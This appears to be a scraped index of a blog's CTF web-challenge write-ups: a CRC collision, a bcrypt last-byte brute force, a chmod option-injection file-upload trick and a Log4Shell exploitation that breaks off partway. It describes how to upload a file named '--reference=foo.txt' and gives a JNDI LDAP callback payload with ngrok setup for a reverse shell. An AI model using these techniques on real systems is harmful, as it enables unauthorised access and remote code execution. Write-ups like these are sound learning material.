Crahp","uri":"/posts/2025/02/07/crahp/"},{"categories":["Ethical Hacking/CTFs/Jeopardy/Nullcon-Goa-HackIM-CTF-2025/Web"],"content":"Approach The exploit follows exactly the procedure described above, and then it sends the request, extracting the flag using a regex and printing it.  Exploit 🚩 Flag Capture Flag ","date":"07/02/2025","objectID":"/posts/2025/02/07/crahp/:7:0","tags":["💥 CRC Collision","🌐 Web Security"],"title":"🌐 Crahp","uri":"/posts/2025/02/07/crahp/"},{"categories":["Ethical Hacking/CTFs/Jeopardy/Nullcon-Goa-HackIM-CTF-2025/Web"],"content":"Proof of Execution Automated Flag Screenshot of successful exploitation 🔧 Tools Used Tool Purpose Python Exploit 💡 Key Learnings ","date":"07/02/2025","objectID":"/posts/2025/02/07/crahp/:8:0","tags":["💥 CRC Collision","🌐 Web Security"],"title":"🌐 Crahp","uri":"/posts/2025/02/07/crahp/"},{"categories":["Ethical Hacking/CTFs/Jeopardy/Nullcon-Goa-HackIM-CTF-2025/Web"],"content":"New Knowledge I have learned what a CRC function is and how it can be exploited to find a similar string that has the same checksum to pass the checks. ","date":"07/02/2025","objectID":"/posts/2025/02/07/crahp/:9:0","tags":["💥 CRC Collision","🌐 Web Security"],"title":"🌐 Crahp","uri":"/posts/2025/02/07/crahp/"},{"categories":["Ethical Hacking/CTFs/Jeopardy/Nullcon-Goa-HackIM-CTF-2025/Web"],"content":"Skills Improved Binary Exploitation Reverse Engineering Web Exploitation Cryptography Forensics OSINT Miscellaneous 📚 References \u0026 Resources ","date":"07/02/2025","objectID":"/posts/2025/02/07/crahp/:10:0","tags":["💥 CRC Collision","🌐 Web Security"],"title":"🌐 Crahp","uri":"/posts/2025/02/07/crahp/"},{"categories":["Ethical Hacking/CTFs/Jeopardy/Nullcon-Goa-HackIM-CTF-2025/Web"],"content":"Learning Resources https://stackoverflow.com/questions/18569984/crc16-collision-2-crc-values-of-blocks-of-different-size https://fastercapital.com/content/Understanding-CRC-Collision--Preventing-Data-Corruption.html 📊 Final Statistics Metric Value Notes Time to Solve 00:33 From start to flag Global Ranking (At the time of flag submission) 28/1017 Challenge ranking Points Earned 500 Team contribution Created: 01-02-2025 • Last Modified: 01-02-2025 Author: mH4ck3r0n3 • Team: QnQSec ","date":"07/02/2025","objectID":"/posts/2025/02/07/crahp/:11:0","tags":["💥 CRC Collision","🌐 Web Security"],"title":"🌐 Crahp","uri":"/posts/2025/02/07/crahp/"},{"categories":["Ethical Hacking/CTFs/Jeopardy/Nullcon-Goa-HackIM-CTF-2025/Web"],"content":"A detailed write-up of the Web challenge 'Bfail' from NullCon Goa HackIM CTF - 2025","date":"07/02/2025","objectID":"/posts/2025/02/07/bfail/","tags":["🔓 Partial Password Exposure","🔑 bcrypt","🌐 Web Security"],"title":"🌐 Bfail","uri":"/posts/2025/02/07/bfail/"},{"categories":["Ethical Hacking/CTFs/Jeopardy/Nullcon-Goa-HackIM-CTF-2025/Web"],"content":" Challenge Presentation ","date":"07/02/2025","objectID":"/posts/2025/02/07/bfail/:0:0","tags":["🔓 Partial Password Exposure","🔑 bcrypt","🌐 Web Security"],"title":"🌐 Bfail","uri":"/posts/2025/02/07/bfail/"},{"categories":["Ethical Hacking/CTFs/Jeopardy/Nullcon-Goa-HackIM-CTF-2025/Web"],"content":"📊 Challenge Overview Category Details Additional Info 🏆 Event Nullcon Goa HackIM 2025 CTF Event Link 🔰 Category Web 🌐 💎 Points 500 Out of 500 total ⭐ Difficulty 🟢 Easy Personal Rating: 3/10 👤 Author @gehaxelt Profile 🎮 Solves (At the time of flag submission) 21 XX% solve rate 📅 Date 01-02-2025 Nullcon Goa HackIM 2025 CTF Day X 🦾 Solved By mH4ck3r0n3 Team: QnQSec ","date":"07/02/2025","objectID":"/posts/2025/02/07/bfail/:1:0","tags":["🔓 Partial Password Exposure","🔑 bcrypt","🌐 Web Security"],"title":"🌐 Bfail","uri":"/posts/2025/02/07/bfail/"},{"categories":["Ethical Hacking/CTFs/Jeopardy/Nullcon-Goa-HackIM-CTF-2025/Web"],"content":"📝 Challenge Information To ‘B’ secure or to ‘b’ fail? Strong passwords for admins are always great, right? http://52.59.124.14:5013 ","date":"07/02/2025","objectID":"/posts/2025/02/07/bfail/:2:0","tags":["🔓 Partial Password Exposure","🔑 bcrypt","🌐 Web Security"],"title":"🌐 Bfail","uri":"/posts/2025/02/07/bfail/"},{"categories":["Ethical Hacking/CTFs/Jeopardy/Nullcon-Goa-HackIM-CTF-2025/Web"],"content":"🎯 Challenge Files \u0026 Infrastructure ","date":"07/02/2025","objectID":"/posts/2025/02/07/bfail/:3:0","tags":["🔓 Partial Password Exposure","🔑 bcrypt","🌐 Web Security"],"title":"🌐 Bfail","uri":"/posts/2025/02/07/bfail/"},{"categories":["Ethical Hacking/CTFs/Jeopardy/Nullcon-Goa-HackIM-CTF-2025/Web"],"content":"Provided Files Files: None 🔍 Initial Analysis ","date":"07/02/2025","objectID":"/posts/2025/02/07/bfail/:3:1","tags":["🔓 Partial Password Exposure","🔑 bcrypt","🌐 Web Security"],"title":"🌐 Bfail","uri":"/posts/2025/02/07/bfail/"},{"categories":["Ethical Hacking/CTFs/Jeopardy/Nullcon-Goa-HackIM-CTF-2025/Web"],"content":"First Steps Initially, the website appears as follows: Site Presentation While inspecting the code with ChromeDevTools, I found this: Page Source Interesting, so by visiting /source, we will have the source code of the page: Source Code As we can see, it leaks the password in bytes: \\xec\\x9f\\xe0a\\x978\\xfc\\xb6:T\\xe2\\xa0\\xc9\u003c\\x9e\\x1a\\xa5\\xfao\\xb2\\x15\\x86\\xe5$\\x86Z\\x1a\\xd4\\xca#\\x15\\xd2x\\xa0\\x0e0\\xca\\xbc\\x89T\\xc5V6\\xf1\\xa4\\xa8S\\x8a%I\\xd8gI\\x15\\xe9\\xe7$M\\x15\\xdc@\\xa9\\xa1@\\x9c\\xeee\\xe0\\xe0\\xf76 and the full password in hash: $2b$12$8bMrI6D9TMYXeMv8pq8RjemsZg.HekhkQUqLymBic/cRhiKRa3YPK and honestly, this comment is also very interesting: # This is super strong! The password was generated quite securely. Here are the first 70 bytes, since you won't be able to brute-force the rest anyway... strongpw = bcrypt.hashpw(os.urandom(128),bcrypt.gensalt()) # \u003e\u003e\u003e strongpw[:71] As we can see, the leak is of the first 70 bytes of the password, while a total of 71 bytes are used. Let’s proceed with the exploit. ","date":"07/02/2025","objectID":"/posts/2025/02/07/bfail/:4:0","tags":["🔓 Partial Password Exposure","🔑 bcrypt","🌐 Web Security"],"title":"🌐 Bfail","uri":"/posts/2025/02/07/bfail/"},{"categories":["Ethical Hacking/CTFs/Jeopardy/Nullcon-Goa-HackIM-CTF-2025/Web"],"content":"🔬 Vulnerability Analysis ","date":"07/02/2025","objectID":"/posts/2025/02/07/bfail/:5:0","tags":["🔓 Partial Password Exposure","🔑 bcrypt","🌐 Web Security"],"title":"🌐 Bfail","uri":"/posts/2025/02/07/bfail/"},{"categories":["Ethical Hacking/CTFs/Jeopardy/Nullcon-Goa-HackIM-CTF-2025/Web"],"content":"Potential Vulnerabilities Partial Hash Exposure (bcrypt) 🎯 Solution Path ","date":"07/02/2025","objectID":"/posts/2025/02/07/bfail/:5:1","tags":["🔓 Partial Password Exposure","🔑 bcrypt","🌐 Web Security"],"title":"🌐 Bfail","uri":"/posts/2025/02/07/bfail/"},{"categories":["Ethical Hacking/CTFs/Jeopardy/Nullcon-Goa-HackIM-CTF-2025/Web"],"content":"Exploitation Steps ","date":"07/02/2025","objectID":"/posts/2025/02/07/bfail/:6:0","tags":["🔓 Partial Password Exposure","🔑 bcrypt","🌐 Web Security"],"title":"🌐 Bfail","uri":"/posts/2025/02/07/bfail/"},{"categories":["Ethical Hacking/CTFs/Jeopardy/Nullcon-Goa-HackIM-CTF-2025/Web"],"content":"Initial setup The exploit was based on brute-forcing that remaining byte since 71-70=1. That’s a total of 256 combinations (nothing too challenging for a brute force). Once completed, we have the full password, which we will obviously verify by converting it into a hash and comparing it with the previously obtained hash. ","date":"07/02/2025","objectID":"/posts/2025/02/07/bfail/:6:1","tags":["🔓 Partial Password Exposure","🔑 bcrypt","🌐 Web Security"],"title":"🌐 Bfail","uri":"/posts/2025/02/07/bfail/"},{"categories":["Ethical Hacking/CTFs/Jeopardy/Nullcon-Goa-HackIM-CTF-2025/Web"],"content":"Exploitation I wrote a Python script to do all of this, and then I executed it: python exploit.py I also sent the request directly to the server using Http, since a simple GET or POST returned Method Not Allowed. I then took the server’s response, extracted the flag using a regex, and subsequently printed it. ","date":"07/02/2025","objectID":"/posts/2025/02/07/bfail/:6:2","tags":["🔓 Partial Password Exposure","🔑 bcrypt","🌐 Web Security"],"title":"🌐 Bfail","uri":"/posts/2025/02/07/bfail/"},{"categories":["Ethical Hacking/CTFs/Jeopardy/Nullcon-Goa-HackIM-CTF-2025/Web"],"content":"Flag capture Manual Flag 🛠️ Exploitation Process ","date":"07/02/2025","objectID":"/posts/2025/02/07/bfail/:6:3","tags":["🔓 Partial Password Exposure","🔑 bcrypt","🌐 Web Security"],"title":"🌐 Bfail","uri":"/posts/2025/02/07/bfail/"},{"categories":["Ethical Hacking/CTFs/Jeopardy/Nullcon-Goa-HackIM-CTF-2025/Web"],"content":"Approach The exploit literally follows the procedure described above:  Exploit 🚩 Flag Capture Flag ","date":"07/02/2025","objectID":"/posts/2025/02/07/bfail/:7:0","tags":["🔓 Partial Password Exposure","🔑 bcrypt","🌐 Web Security"],"title":"🌐 Bfail","uri":"/posts/2025/02/07/bfail/"},{"categories":["Ethical Hacking/CTFs/Jeopardy/Nullcon-Goa-HackIM-CTF-2025/Web"],"content":"Proof of Execution Automated Flag Screenshot of successful exploitation 🔧 Tools Used Tool Purpose Python Exploit 💡 Key Learnings ","date":"07/02/2025","objectID":"/posts/2025/02/07/bfail/:8:0","tags":["🔓 Partial Password Exposure","🔑 bcrypt","🌐 Web Security"],"title":"🌐 Bfail","uri":"/posts/2025/02/07/bfail/"},{"categories":["Ethical Hacking/CTFs/Jeopardy/Nullcon-Goa-HackIM-CTF-2025/Web"],"content":"New Knowledge I discovered that if you know part of the hash with bcrypt, you can perform a brute force. ","date":"07/02/2025","objectID":"/posts/2025/02/07/bfail/:8:1","tags":["🔓 Partial Password Exposure","🔑 bcrypt","🌐 Web Security"],"title":"🌐 Bfail","uri":"/posts/2025/02/07/bfail/"},{"categories":["Ethical Hacking/CTFs/Jeopardy/Nullcon-Goa-HackIM-CTF-2025/Web"],"content":"Skills Improved Binary Exploitation Reverse Engineering Web Exploitation Cryptography Forensics OSINT Miscellaneous 📊 Final Statistics Metric Value Notes Time to Solve 00:08 From start to flag Global Ranking (At the time of flag submission) 9/535 Challenge ranking Points Earned 500 Team contribution Created: 01-02-2025 • Last Modified: 01-02-2025 Author: mH4ck3r0n3 • Team: QnQSec ","date":"07/02/2025","objectID":"/posts/2025/02/07/bfail/:8:2","tags":["🔓 Partial Password Exposure","🔑 bcrypt","🌐 Web Security"],"title":"🌐 Bfail","uri":"/posts/2025/02/07/bfail/"},{"categories":["Ethical Hacking/CTFs/Jeopardy/x3CTF-2025/Web"],"content":"A detailed write-up of the Web challenge 'Submission' from x3CTF - 2025","date":"06/02/2025","objectID":"/posts/2025/02/06/submission/","tags":["🔐 Insecure File Permission","💉 Bash Glob Injection","🌐 Web Security"],"title":"🌐 Submission","uri":"/posts/2025/02/06/submission/"},{"categories":["Ethical Hacking/CTFs/Jeopardy/x3CTF-2025/Web"],"content":" Challenge Presentation ","date":"06/02/2025","objectID":"/posts/2025/02/06/submission/:0:0","tags":["🔐 Insecure File Permission","💉 Bash Glob Injection","🌐 Web Security"],"title":"🌐 Submission","uri":"/posts/2025/02/06/submission/"},{"categories":["Ethical Hacking/CTFs/Jeopardy/x3CTF-2025/Web"],"content":"📊 Challenge Overview Category Details Additional Info 🏆 Event x3CTF - 2025 Event Link 🔰 Category Web 🌐 💎 Points 500 Out of 500 total ⭐ Difficulty 🟢 Easy Personal Rating: 4/10 👤 Author rebane2001 Profile 🎮 Solves (At the time of flag submission) 16 XX% solve rate 📅 Date 24-01-2025 x3CTF - 2025 Day X 🦾 Solved By xtea418 Team: QnQSec ","date":"06/02/2025","objectID":"/posts/2025/02/06/submission/:1:0","tags":["🔐 Insecure File Permission","💉 Bash Glob Injection","🌐 Web Security"],"title":"🌐 Submission","uri":"/posts/2025/02/06/submission/"},{"categories":["Ethical Hacking/CTFs/Jeopardy/x3CTF-2025/Web"],"content":"📝 Challenge Information Could you help us out? ","date":"06/02/2025","objectID":"/posts/2025/02/06/submission/:2:0","tags":["🔐 Insecure File Permission","💉 Bash Glob Injection","🌐 Web Security"],"title":"🌐 Submission","uri":"/posts/2025/02/06/submission/"},{"categories":["Ethical Hacking/CTFs/Jeopardy/x3CTF-2025/Web"],"content":"🎯 Challenge Files \u0026 Infrastructure ","date":"06/02/2025","objectID":"/posts/2025/02/06/submission/:3:0","tags":["🔐 Insecure File Permission","💉 Bash Glob Injection","🌐 Web Security"],"title":"🌐 Submission","uri":"/posts/2025/02/06/submission/"},{"categories":["Ethical Hacking/CTFs/Jeopardy/x3CTF-2025/Web"],"content":"Provided Files Files:  Attached Files 🔍 Initial Analysis ","date":"06/02/2025","objectID":"/posts/2025/02/06/submission/:3:1","tags":["🔐 Insecure File Permission","💉 Bash Glob Injection","🌐 Web Security"],"title":"🌐 Submission","uri":"/posts/2025/02/06/submission/"},{"categories":["Ethical Hacking/CTFs/Jeopardy/x3CTF-2025/Web"],"content":"First Steps Initially, the website appears as follows: Site Presentation There is a file upload section where only .txt files can be uploaded. Reading the attached files, there was only a PHP file: if (isset($_FILES['file'])) { $uploadOk = 1; $target_dir = \"/var/www/html/uploads/\"; $target_file = $target_dir . basename($_FILES[\"file\"][\"name\"]); if (file_exists($target_file)) { echo \"Sorry, file already exists.\"; $uploadOk = 0; } if ($_FILES[\"file\"][\"size\"] \u003e 50000) { echo \"Sorry, your file is too large you need to buy Nitro.\"; $uploadOk = 0; } if (!str_ends_with($target_file, '.txt')) { echo \"Due to exploit you can only upload files with .txt extensions sorry about this but we got hacked last time so we have to check this from now on.\"; $uploadOk = 0; } // Check if $uploadOk is set to 0 by an error if ($uploadOk == 0) { echo \"Sorry, your file was not uploaded.\"; // if everything is ok, try to upload file } else { if (move_uploaded_file($_FILES[\"file\"][\"tmp_name\"], $target_file)) { echo \"The file \". htmlspecialchars( basename( $_FILES[\"file\"][\"name\"])). \" has been uploaded.\"; } else { echo \"Sorry, there was an error uploading your file.\"; } } $old_path = getcwd(); chdir($target_dir); // make unreadable shell_exec('chmod 000 *'); chdir($old_path); } As we can see, the files are uploaded to the /uploads folder, followed by various checks, including one on the file size and another on the extension, which must always end with .txt. Initially, I thought of uploading a malicious PHP file to read flag.txt, which was located under the uploads folder, since trying to access /uploads/flag.txt returned 403 Forbidden. I attempted to bypass the extension check with a null byte, using exploit.php%00.txt, but it didn’t work. Searching online, I found another type of attack that allowed command execution through the .htaccess file. Interestingly, when I tried uploading a file starting with ., I was able to read it using the /uploads/filename route (but I quickly realized why). As we can see, a chmod 000 * command is executed right after the upload, setting all permissions to null for every file in the uploads folder. This was why accessing files through the browser returned 403 Forbidden. It is also the reason why I was able to read the files I uploaded with a . at the beginning of the name. The chmod ... * command affects all visible files but doesn’t include hidden files (those starting with . or special characters, such as -). Since their permissions weren’t nullified, I could still access them. From there, I did some research to better understand how chmod works and realized it was an issue of insecure file permissions. Now, let’s move on to the exploit. ","date":"06/02/2025","objectID":"/posts/2025/02/06/submission/:4:0","tags":["🔐 Insecure File Permission","💉 Bash Glob Injection","🌐 Web Security"],"title":"🌐 Submission","uri":"/posts/2025/02/06/submission/"},{"categories":["Ethical Hacking/CTFs/Jeopardy/x3CTF-2025/Web"],"content":"🔬 Vulnerability Analysis ","date":"06/02/2025","objectID":"/posts/2025/02/06/submission/:5:0","tags":["🔐 Insecure File Permission","💉 Bash Glob Injection","🌐 Web Security"],"title":"🌐 Submission","uri":"/posts/2025/02/06/submission/"},{"categories":["Ethical Hacking/CTFs/Jeopardy/x3CTF-2025/Web"],"content":"Potential Vulnerabilities Insecure File Permission 🎯 Solution Path ","date":"06/02/2025","objectID":"/posts/2025/02/06/submission/:5:1","tags":["🔐 Insecure File Permission","💉 Bash Glob Injection","🌐 Web Security"],"title":"🌐 Submission","uri":"/posts/2025/02/06/submission/"},{"categories":["Ethical Hacking/CTFs/Jeopardy/x3CTF-2025/Web"],"content":"Exploitation Steps ","date":"06/02/2025","objectID":"/posts/2025/02/06/submission/:6:0","tags":["🔐 Insecure File Permission","💉 Bash Glob Injection","🌐 Web Security"],"title":"🌐 Submission","uri":"/posts/2025/02/06/submission/"},{"categories":["Ethical Hacking/CTFs/Jeopardy/x3CTF-2025/Web"],"content":"Initial setup After doing some research, I discovered that there is a specific flag that can be used with the chmod command, --reference=filename file, which allows you to set the permissions of the target file (passed as an argument) to match those of the reference file (like a copy-and-paste of permissions). So, I decided to exploit this flag, given that chmod was being applied to * (a wildcard indicating “all”). By setting the permissions of all files in the folder, I thought of using this to my advantage. ","date":"06/02/2025","objectID":"/posts/2025/02/06/submission/:6:1","tags":["🔐 Insecure File Permission","💉 Bash Glob Injection","🌐 Web Security"],"title":"🌐 Submission","uri":"/posts/2025/02/06/submission/"},{"categories":["Ethical Hacking/CTFs/Jeopardy/x3CTF-2025/Web"],"content":"Exploitation The exploitation essentially relies on uploading a file named --reference=foo.txt, for example (since there is always an extension check): First Part Once the upload is done, chmod is called, and all the permissions are set to null. However, the exploit doesn’t stop there. In fact, for the reference flag, you need to specify a file, as we mentioned, foo.txt, so I uploaded that file as well: Second Part Once the file is uploaded, chmod will be executed on all the files, and as soon as it reaches the file --reference=foo.txt, it will treat it as a flag in the execution of the command. This will set the permissions of all files in the folder to match those of the foo.txt file (which, being the last one uploaded, still has active read permissions because chmod hasn’t been executed on it yet). As a result, the read permission for the flag.txt file will also be set, and by accessing the /uploads/flag.txt route, I was able to read the flag. ","date":"06/02/2025","objectID":"/posts/2025/02/06/submission/:6:2","tags":["🔐 Insecure File Permission","💉 Bash Glob Injection","🌐 Web Security"],"title":"🌐 Submission","uri":"/posts/2025/02/06/submission/"},{"categories":["Ethical Hacking/CTFs/Jeopardy/x3CTF-2025/Web"],"content":"Flag capture Manual Flag 🛠️ Exploitation Process ","date":"06/02/2025","objectID":"/posts/2025/02/06/submission/:6:3","tags":["🔐 Insecure File Permission","💉 Bash Glob Injection","🌐 Web Security"],"title":"🌐 Submission","uri":"/posts/2025/02/06/submission/"},{"categories":["Ethical Hacking/CTFs/Jeopardy/x3CTF-2025/Web"],"content":"Approach The exploit does exactly as described manually: it uses the --reference flag of chmod to apply the permissions of the foo.txt file to all the files, including flag.txt, and then retrieves the flag by accessing the /uploads/flag.txt route.  Exploit 🚩 Flag Capture Flag ","date":"06/02/2025","objectID":"/posts/2025/02/06/submission/:7:0","tags":["🔐 Insecure File Permission","💉 Bash Glob Injection","🌐 Web Security"],"title":"🌐 Submission","uri":"/posts/2025/02/06/submission/"},{"categories":["Ethical Hacking/CTFs/Jeopardy/x3CTF-2025/Web"],"content":"Proof of Execution Automated Flag Screenshot of successful exploitation 🔧 Tools Used Tool Purpose Python Exploit 💡 Key Learnings ","date":"06/02/2025","objectID":"/posts/2025/02/06/submission/:8:0","tags":["🔐 Insecure File Permission","💉 Bash Glob Injection","🌐 Web Security"],"title":"🌐 Submission","uri":"/posts/2025/02/06/submission/"},{"categories":["Ethical Hacking/CTFs/Jeopardy/x3CTF-2025/Web"],"content":"New Knowledge I learned that chmod ignores hidden files (those named with .something or files starting with -). I also learned that when the --reference=filename file parameter is used, it sets the permissions of the target file to match those of the file specified as the reference. ","date":"06/02/2025","objectID":"/posts/2025/02/06/submission/:9:0","tags":["🔐 Insecure File Permission","💉 Bash Glob Injection","🌐 Web Security"],"title":"🌐 Submission","uri":"/posts/2025/02/06/submission/"},{"categories":["Ethical Hacking/CTFs/Jeopardy/x3CTF-2025/Web"],"content":"Skills Improved Binary Exploitation Reverse Engineering Web Exploitation Cryptography Forensics OSINT Miscellaneous 📚 References \u0026 Resources ","date":"06/02/2025","objectID":"/posts/2025/02/06/submission/:10:0","tags":["🔐 Insecure File Permission","💉 Bash Glob Injection","🌐 Web Security"],"title":"🌐 Submission","uri":"/posts/2025/02/06/submission/"},{"categories":["Ethical Hacking/CTFs/Jeopardy/x3CTF-2025/Web"],"content":"Learning Resources https://www.tecmint.com/copy-file-permissions-and-ownership-to-another-file-in-linux/ 📊 Final Statistics Metric Value Notes Time to Solve 00:20 From start to flag Global Ranking (At the time of flag submission) 2/975 Challenge ranking Points Earned 500 Team contribution Created: 24-01-2025 • Last Modified: 24-01-2025 Author: mH4ck3r0n3 • Team: QnQSec ","date":"06/02/2025","objectID":"/posts/2025/02/06/submission/:11:0","tags":["🔐 Insecure File Permission","💉 Bash Glob Injection","🌐 Web Security"],"title":"🌐 Submission","uri":"/posts/2025/02/06/submission/"},{"categories":["Ethical Hacking/CTFs/Jeopardy/SrdnlenCTF-2025/Web"],"content":"A detailed write-up of the Web challenge 'Sparkling Sky' from SrdnlenCTF - 2025","date":"05/02/2025","objectID":"/posts/2025/02/05/sparkling-sky/","tags":["⚠️ CVE-2021-44228 (Log4Shell)","📜 Log4j","⚠️ CVE","🌐 Web Security"],"title":"🌐 Sparkling Sky","uri":"/posts/2025/02/05/sparkling-sky/"},{"categories":["Ethical Hacking/CTFs/Jeopardy/SrdnlenCTF-2025/Web"],"content":" Challenge Presentation ","date":"05/02/2025","objectID":"/posts/2025/02/05/sparkling-sky/:0:0","tags":["⚠️ CVE-2021-44228 (Log4Shell)","📜 Log4j","⚠️ CVE","🌐 Web Security"],"title":"🌐 Sparkling Sky","uri":"/posts/2025/02/05/sparkling-sky/"},{"categories":["Ethical Hacking/CTFs/Jeopardy/SrdnlenCTF-2025/Web"],"content":"📊 Challenge Overview Category Details Additional Info 🏆 Event SrdnlenCTF - 2025 Event Link 🔰 Category Web 🌐 💎 Points 500 Out of XXXX total ⭐ Difficulty 🟡 Medium Personal Rating: 5/10 👤 Author sanmatte Profile 🎮 Solves (At the time of flag submission) 49 XX% solve rate 📅 Date 19-01-2025 SrdnlenCTF - 2025 Day X 🦾 Solved By devgianlu Team: Team Aetruria ","date":"05/02/2025","objectID":"/posts/2025/02/05/sparkling-sky/:1:0","tags":["⚠️ CVE-2021-44228 (Log4Shell)","📜 Log4j","⚠️ CVE","🌐 Web Security"],"title":"🌐 Sparkling Sky","uri":"/posts/2025/02/05/sparkling-sky/"},{"categories":["Ethical Hacking/CTFs/Jeopardy/SrdnlenCTF-2025/Web"],"content":"📝 Challenge Information I am developing a game with websockets in python. I left my pc to a java fan, I think he really messed up. It is forbidden to perform or attempt to perform any action against the infrastructure or the challenge itself. username: user1337 password: user1337 website: http://sparklingsky.challs.srdnlen.it:8081 ","date":"05/02/2025","objectID":"/posts/2025/02/05/sparkling-sky/:2:0","tags":["⚠️ CVE-2021-44228 (Log4Shell)","📜 Log4j","⚠️ CVE","🌐 Web Security"],"title":"🌐 Sparkling Sky","uri":"/posts/2025/02/05/sparkling-sky/"},{"categories":["Ethical Hacking/CTFs/Jeopardy/SrdnlenCTF-2025/Web"],"content":"🎯 Challenge Files \u0026 Infrastructure ","date":"05/02/2025","objectID":"/posts/2025/02/05/sparkling-sky/:3:0","tags":["⚠️ CVE-2021-44228 (Log4Shell)","📜 Log4j","⚠️ CVE","🌐 Web Security"],"title":"🌐 Sparkling Sky","uri":"/posts/2025/02/05/sparkling-sky/"},{"categories":["Ethical Hacking/CTFs/Jeopardy/SrdnlenCTF-2025/Web"],"content":"Provided Files Files:  Attached Files 🔍 Initial Analysis ","date":"05/02/2025","objectID":"/posts/2025/02/05/sparkling-sky/:3:1","tags":["⚠️ CVE-2021-44228 (Log4Shell)","📜 Log4j","⚠️ CVE","🌐 Web Security"],"title":"🌐 Sparkling Sky","uri":"/posts/2025/02/05/sparkling-sky/"},{"categories":["Ethical Hacking/CTFs/Jeopardy/SrdnlenCTF-2025/Web"],"content":"First Steps Initially, the website appears as follows: Site Presentation By entering the login credentials specified in the challenge description, we are redirected to this page: Play From here, every time I clicked on play, nothing happened; only the access number in the queue changed. For this reason, I decided to read the attached files, and the first thing that caught my eye was the log4j.properties file. From there, I realized it was using Log4j, so I went to check the installed version in the Dockerfile: RUN cd $(python -c \"import os, pyspark; print(os.path.dirname(pyspark.__file__))\")/jars \u0026\u0026 \\ rm log4j* \u0026\u0026 \\ wget https://repo1.maven.org/maven2/org/apache/logging/log4j/log4j-core/2.14.1/log4j-core-2.14.1.jar \u0026\u0026 \\ wget https://repo1.maven.org/maven2/org/apache/logging/log4j/log4j-api/2.14.1/log4j-api-2.14.1.jar \u0026\u0026 \\ wget https://repo1.maven.org/maven2/org/apache/logging/log4j/log4j-slf4j-impl/2.14.1/log4j-slf4j-impl-2.14.1.jar \u0026\u0026 \\ wget https://repo1.maven.org/maven2/org/apache/logging/log4j/log4j-1.2-api/2.14.1/log4j-1.2-api-2.14.1.jar As we can see, the version is 2.14.1. Searching online, this version is vulnerable to CVE-2021-44228. Now we just need to figure out how to send the payload to exploit it. Continuing to read, I noticed in the anticheat.py file the use of spark and log4j, so I understood that the game’s anticheat system needed to be triggered in some way to exploit the vulnerability: log4j_config_path = \"log4j.properties\" spark = SparkSession.builder \\ .appName(\"Anticheat\") \\ .config(\"spark.driver.extraJavaOptions\", \"-Dcom.sun.jndi.ldap.object.trustURLCodebase=true -Dlog4j.configuration=file:\" + log4j_config_path) \\ .config(\"spark.executor.extraJavaOptions\", \"-Dcom.sun.jndi.ldap.object.trustURLCodebase=true -Dlog4j.configuration=file:\" + log4j_config_path) \\ .getOrCreate() logger = spark._jvm.org.apache.log4j.LogManager.getLogger(\"Anticheat\") Continuing to read the files, I noticed that the browser and server also communicate via Socket.IO. However, if we examine the socket.py file, we see that there is no input validation. Even though our account is just a spectator, we can call any function. The handle_bird_movement function, although it uses the user ID, does not take it from cookies. It retrieves it from user-controlled input, so we can provide any ID we want, whether it belongs to a player or a spectator: def init_socket_events(socketio, players): @socketio.on('connect') @login_required def handle_connect(): user_id = int(current_user.get_id()) log_action(user_id, \"is connecting\") if user_id in players.keys(): # Player already exists, send their current position emit('connected', {'user_id': user_id, 'x': players[user_id]['x'], 'y': players[user_id]['y'], 'angle': players[user_id]['angle']}) else: # TODO: Check if the lobby is full and add the player to the queue log_action(user_id, f\"is spectating\") emit('update_bird_positions', players, broadcast=True) @socketio.on('move_bird') @login_required def handle_bird_movement(data): user_id = data.get('user_id') if user_id in players: del data['user_id'] if players[user_id] != data: with lock: players[user_id] = { 'x': data['x'], 'y': data['y'], 'color': 'black', 'angle': data.get('angle', 0) } if analyze_movement(user_id, data['x'], data['y'], data.get('angle', 0)): log_action(user_id, f\"was cheating with final position ({data['x']}, {data['y']}) and final angle: {data['angle']}\") # del players[user_id] # Remove the player from the game - we are in beta so idc emit('update_bird_positions', players, broadcast=True) @socketio.on('disconnect') @login_required def handle_disconnect(data): user_id = current_user.get_id() if user_id in players: del players[user_id] emit('update_bird_positions', players, broadcast=True) To trigger the anticheat, we still need to bypass the analyze_movement function. This function calculates whether our speed exceeds a certain threshold (the speed is calculated using other data like coordinates and timestamps). If it detects suspicious movement, it will log the attempt (inserting our payload into the logs). It also interpolates the angle property, which is never used in analyze_movement, so we can set it to whatever we want. Let’s proceed with the exploit. ","date":"05/02/2025","objectID":"/posts/2025/02/05/sparkling-sky/:4:0","tags":["⚠️ CVE-2021-44228 (Log4Shell)","📜 Log4j","⚠️ CVE","🌐 Web Security"],"title":"🌐 Sparkling Sky","uri":"/posts/2025/02/05/sparkling-sky/"},{"categories":["Ethical Hacking/CTFs/Jeopardy/SrdnlenCTF-2025/Web"],"content":"🔬 Vulnerability Analysis ","date":"05/02/2025","objectID":"/posts/2025/02/05/sparkling-sky/:5:0","tags":["⚠️ CVE-2021-44228 (Log4Shell)","📜 Log4j","⚠️ CVE","🌐 Web Security"],"title":"🌐 Sparkling Sky","uri":"/posts/2025/02/05/sparkling-sky/"},{"categories":["Ethical Hacking/CTFs/Jeopardy/SrdnlenCTF-2025/Web"],"content":"Potential Vulnerabilities Log4Shell 🎯 Solution Path ","date":"05/02/2025","objectID":"/posts/2025/02/05/sparkling-sky/:5:1","tags":["⚠️ CVE-2021-44228 (Log4Shell)","📜 Log4j","⚠️ CVE","🌐 Web Security"],"title":"🌐 Sparkling Sky","uri":"/posts/2025/02/05/sparkling-sky/"},{"categories":["Ethical Hacking/CTFs/Jeopardy/SrdnlenCTF-2025/Web"],"content":"Exploitation Steps ","date":"05/02/2025","objectID":"/posts/2025/02/05/sparkling-sky/:6:0","tags":["⚠️ CVE-2021-44228 (Log4Shell)","📜 Log4j","⚠️ CVE","🌐 Web Security"],"title":"🌐 Sparkling Sky","uri":"/posts/2025/02/05/sparkling-sky/"},{"categories":["Ethical Hacking/CTFs/Jeopardy/SrdnlenCTF-2025/Web"],"content":"Initial setup The exploit essentially relies on sending a string like jndi:ldap://\u003cip\u003e:1389/a to the server to have it written in the Log4j logs. Once this is done, we will receive a connection on our previously started server, obtaining a reverse shell. ","date":"05/02/2025","objectID":"/posts/2025/02/05/sparkling-sky/:6:1","tags":["⚠️ CVE-2021-44228 (Log4Shell)","📜 Log4j","⚠️ CVE","🌐 Web Security"],"title":"🌐 Sparkling Sky","uri":"/posts/2025/02/05/sparkling-sky/"},{"categories":["Ethical Hacking/CTFs/Jeopardy/SrdnlenCTF-2025/Web"],"content":"Exploitation First, I set up the port forwarding, as the poc.py file that exploits the vulnerability requires 3 port forwardings: ngrok tcp 1389 ngrok http 8080 ngrok tcp 9001 The first port is where the LDAP server will be hosted, the second is for the web server where the string we send will retrieve the java exploit 